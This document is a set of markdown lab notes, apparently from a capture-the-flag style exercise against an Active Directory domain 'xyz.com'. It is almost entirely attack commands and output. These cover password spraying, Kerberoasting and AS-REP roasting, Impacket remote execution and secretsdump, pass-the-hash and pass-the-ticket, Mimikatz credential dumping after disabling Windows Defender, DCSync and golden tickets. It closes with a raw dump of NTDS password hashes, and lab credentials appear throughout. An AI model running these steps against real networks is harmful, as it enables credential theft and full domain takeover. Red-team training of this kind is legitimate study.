# Domain

## Scan Domain Controller's Open Ports
`nmap -Pn 172.140.0.40`

## Password Brute-Forcing

```sh
crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success | grep '[+]'
```

## Check Login
`crackmapexec smb targets.txt -u user -p pass`

## Check Password Policy
`crackmapexec smb targets.txt -u user -p pass --pass-pol`

## Enumerate Users
`crackmapexec smb targets.txt -u user -p pass --users`

## Enumerate Computers
`crackmapexec smb targets.txt -u user -p pass --computers`

## Install Bloodhound

```sh
echo "deb http://httpredir.debian.org/debian stretch-backports main" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list

apt update

wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -

echo 'deb https://debian.neo4j.com stable latest' > /etc/apt/sources.list.d/neo4j.list

apt update

apt install -y apt-transport-https neo4j

service stop neo4j

cd /usr/bin

./neo4j console &

wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.0/BloodHound-linux-x64.zip

mv BloodHound-linux-x64.zip /opt/

cd /opt

unzip BloodHound-linux-x64.zip

chmod +x BloodHound-linux-x64/BloodHound

./BloodHound-linux-x64/BloodHound --no-sandbox &
```

> Access localhost:7474 -> neo4j/neo4j

```sh
pip install bloodhound

echo "172.140.0.40 dc01.xyz.com" >> /etc/hosts
echo -e "nameserver 172.140.0.40\noptions ndots:0" > /etc/resolv.conf
```
> Access http://localhost:7474

`bloodhound-python -u lterry -p brianna -dc dc01.xyz.com -d xyz.com`

## Change Collection Method (More information)
`bloodhound-python -u rbond -p booboo -dc dc01.xyz.com -d xyz.com -c all`

- Login into bloodhound
- Upload data from previous collection
- Explore it

# Impacket

```sh
crackmapexec smb 172.140.0.0/24
crackmapexec winrm 172.140.0.0/24

crackmapexec winrm targets.txt -u users.txt -p passwords.txt --continue-on-success -d xyz.com | grep '[+]'
```

## Get a Shell on that User (Local Admin Account)

`impacket-wmiexec xyz.com/Administrator:completeSecurePassw0rd@172.140.0.40 -debug`

As we have a middle man which is the container, we need to change a little bit the logic of Impacket's python script:
Ref: https://github.com/fortra/impacket/issues/272

`nano /usr/lib/python3/dist-packages/impacket/dcerpc/v5/dcomrt.py`

Line 1283
```py
LOG.debug('StringBinding chosen: %s' % stringBinding)
if stringBinding is None:
	stringBinding = 'ncacn_ip_tcp:%s%s' % (self.get_target(), bindingPort)
    
dcomInterface = transport.DCERPCTransportFactory(stringBinding)
```

`impacket-wmiexec xyz.com/user:password@172.140.0.40 -debug`

- Check privileges: `whoami /priv`

Try `impacket-smbexec` for file shares:
`impacket-smbclient xyz.com/Administrator:completeSecurePassw0rd@172.140.0.40`

```
> shares
> use internal
> cat flag.txt
```

*Running this for an unprivileged user doesn't grant us access to that share.*

Try for rdp as well impacket-psexec, etc:

`impacket-rdp_check xyz.com/rbond:booboo@172.140.0.40`

impacket-psexec doesn't give us any results, maybe because malicious code execution is flagged by Windows:
> Ref: https://www.trustedsec.com/blog/no_psexec_needed/

----------------------------------------------------------------------------------------------------------

### Enumerate AD Objects

`crackmapexec smb 172.140.0.40 -u rbond -p booboo -d xyz.com --rid-brute`

### Brute-forcing Passwords of ServiceAccounts (Only one Kerberoastable)

```sh
crackmapexec smb 172.140.0.40 -u http_svc$ -p passwords.txt
crackmapexec smb 172.140.0.40 -u mssql_svc$ -p passwords.txt
crackmapexec smb 172.140.0.40 -u exchange_svc$ -p passwords.txt
```

http_svc$:scooby

> Refs: https://www.tarlogic.com/blog/how-to-attack-kerberos/

# Kerberos Brute-Force (save TGTs)

The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.

- Install kerbrute:

```
git clone https://github.com/TarlogicSecurity/kerbrute
cd kerbrute
pip install -r requirements.txt
```

Run (where users.txt holds some User Accounts + Service Accounts):

`python3 kerbrute.py -domain xyz.com -users users.txt -passwords passwords.txt -outputfile domain_passwords.txt`

# AS-REP Roasting

Using CME, we can find accounts with no Preauth using:

`crackmapexec ldap 172.140.0.40 -u users.txt -p '' --asreproast out.txt`

And crack the account password offline using:
hashcat -m18200 out.txt passwords.txt

Ref: https://wiki.porchetta.industries/ldap-protocol/asreproast

# Kerberoasting (Needs Domain Account)

Fetch TGS tickets:

> users.txt contains: http_svc$ | mssql_svc$ | exchange_svc$

> Ref: getUsersSPNs.py from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py

Run:

`python getUserSPNs.py xyz.com/nmorgan:christ -usersfile users.txt -outputfile hashes.kerberoast`

- Crack TGS:

`hashcat -m13100 --force -a 0 hashes.kerberoast passwords.txt`

# Overpass The Hash/Pass The Key (PTK)

## Drop NTLM Hashes (Requires Local Admin Account at least)

`impacket-secretsdump xyz.com/bavery:lalala@172.140.0.40`

### Drop only NTLM hashes

`impacket-secretsdump -just-dc-ntlm xyz.com/bavery:lalala@172.140.0.40`

- Grab Administrator account LMHASH:NTHASH hash
- Get Administrator TGT

```sh
impacket-getTGT xyz.com/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:4124f2ac13cbf884c4e0d592846485af

export KRB5CCNAME=/root/Desktop/Administrator.ccache

impacket-wmiexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug

impacket-smbclient xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
```

# Pass The Ticket

- Login as Local Admin in DC using Remote Desktop
- Install Git
- Disable Windows Defender to run Mimikatz (now we can run impacket-psexec: impacket-psexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug)
- Install PsExec (https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- Install Mimikatz
	- `privilege::debug`
	- `token::whoami`
	- `token::elevate`
	- `kerberos::list /export` (Exports tickets to current folder)
	- `kerberos::ptt 0-40e10000-bavery@krbtgt~XYZ.COM-XYZ.COM.kirbi`
	- `klist`
	- `.\PsExec.exe -accepteula \\dc01.xyz.com cmd`
	- Local Credentials (SAM): `lsadump::sam`
	- Dump Domain Cache secrets (LSA): 
		- `lsadump::lsa`
		- `lsadump::lsa /inject /name:administrator`
	- Tons of commands to be used: https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099

# Golden Ticket

## Grab NT Hashes 

`impacket-secretsdump -just-dc-ntlm xyz.com/jhudson:angel1@172.140.0.40`

## Get Domain SID

`crackmapexec ldap dc01.xyz.com -u jhudson -p angel1 --get-sid`

------------------------- Not Working -------------------------

## Craft Ticket and run

```sh
impacket-ticketer -nthash d5e3a0740ad179723a0e3ba300e637fe -domain-sid S-1-5-21-564955801-1803512963-3712075166 -domain xyz.com Administrator

export KRB5CCNAME=~/Desktop/Administrator.ccache

impacket-wmiexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
impacket-smbclient xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
```

------------------------- Not Working -------------------------

### DCSync

Use mimikatz with replication account to perform DCSync attack and get NTLM hashes.

`lsadump::dcsync /domain:xyz.com /user:krbtgt`

### Cont. Golden Ticket (Should be run within a Workstation)

```
kerberos::golden /domain:xyz.com /sid:S-1-5-21-2000547303-2172798533-1239318658 /user:Administrator /krbtgt:a4b2dbb473eef2b77dd1dec119cc5cd9 /id:500 /ptt

misc::cmd

dir \\dc01\c$
```

- Download PsExec

`.\PsExec64.exe -accepteula \\dc01 -s cmd`

whoami returns: nt authority\system

`cd ..\..\Users\Administrator`

`type flag.txt`

> Ref: https://juggernaut-sec.com/domain-persistence-golden-ticket-and-silver-ticket-attacks/

afisher:alejandro

# NTDS file

`crackmapexec smb 172.140.0.40 -u administrator -p completeSecurePassw0rd --ntds`

```
SMB         172.140.0.40    445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:xyz.com) (signing:True) (SMBv1:False)
SMB         172.140.0.40    445    DC01             [+] xyz.com\administrator:completeSecurePassw0rd (Pwn3d!)
SMB         172.140.0.40    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.140.0.40    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:4124f2ac13cbf884c4e0d592846485af:::
SMB         172.140.0.40    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.140.0.40    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:286aa959c8ab2c6dabce150c7b699d25:::
SMB         172.140.0.40    445    DC01             vagrant:1000:aad3b435b51404eeaad3b435b51404ee:4124f2ac13cbf884c4e0d592846485af:::
SMB         172.140.0.40    445    DC01             xyz.com\kpeake:1108:aad3b435b51404eeaad3b435b51404ee:6084ae91972fbeb924a2c906bf57c0ab:::
SMB         172.140.0.40    445    DC01             xyz.com\gchurchill:1109:aad3b435b51404eeaad3b435b51404ee:4339a092b5f8d8289c1314e9f1db9f94:::
SMB         172.140.0.40    445    DC01             xyz.com\jslater:1110:aad3b435b51404eeaad3b435b51404ee:b18ea39a58544b53b43e34200c21d751:::
SMB         172.140.0.40    445    DC01             xyz.com\cbuckland:1111:aad3b435b51404eeaad3b435b51404ee:af5432a79b941528fa7fac9e7e391651:::
SMB         172.140.0.40    445    DC01             xyz.com\ewalsh:1112:aad3b435b51404eeaad3b435b51404ee:b2afd3ee7005887d914650f0d30231c0:::
SMB         172.140.0.40    445    DC01             xyz.com\rkelly:1113:aad3b435b51404eeaad3b435b51404ee:fe9b5105002d720830b2861666851d1b:::
SMB         172.140.0.40    445    DC01             xyz.com\fallan:1114:aad3b435b51404eeaad3b435b51404ee:91d5b3ce10ef251dff59a63f93d34b36:::
SMB         172.140.0.40    445    DC01             xyz.com\jjohnston:1115:aad3b435b51404eeaad3b435b51404ee:6e2ba7aaa0297ecba56e3d90393bc147:::
SMB         172.140.0.40    445    DC01             xyz.com\rbond:1116:aad3b435b51404eeaad3b435b51404ee:70daf8eb7ca45fb508cf24852293609f:::
SMB         172.140.0.40    445    DC01             xyz.com\dhardacre:1117:aad3b435b51404eeaad3b435b51404ee:40d0748f1738f4701024af592dc3756c:::
SMB         172.140.0.40    445    DC01             xyz.com\nmitchell:1118:aad3b435b51404eeaad3b435b51404ee:c52abb1e14677d7ea228fcc1171ed7b7:::
SMB         172.140.0.40    445    DC01             xyz.com\amcgrath:1119:aad3b435b51404eeaad3b435b51404ee:570276986246b42ed08c1044fb6fd1a8:::
SMB         172.140.0.40    445    DC01             DC01$:1001:aad3b435b51404eeaad3b435b51404ee:ee82fb06d0a332342ed3d02037430188:::
SMB         172.140.0.40    445    DC01             http_svc$:1120:aad3b435b51404eeaad3b435b51404ee:9caa9f1a57f1e8959b9cf03c4b6e31f9:::
SMB         172.140.0.40    445    DC01             mssql_svc$:1121:aad3b435b51404eeaad3b435b51404ee:29746486d0a4b86306d63e8b84521882:::
SMB         172.140.0.40    445    DC01             exchange_svc$:1122:aad3b435b51404eeaad3b435b51404ee:7467172e489f15ca013cc9ad03b97ae0:::
SMB         172.140.0.40    445    DC01             [+] Dumped 20 NTDS hashes to /root/.cme/logs/DC01_172.140.0.40_2023-04-24_141454.ntds of which 16 were added to the database
```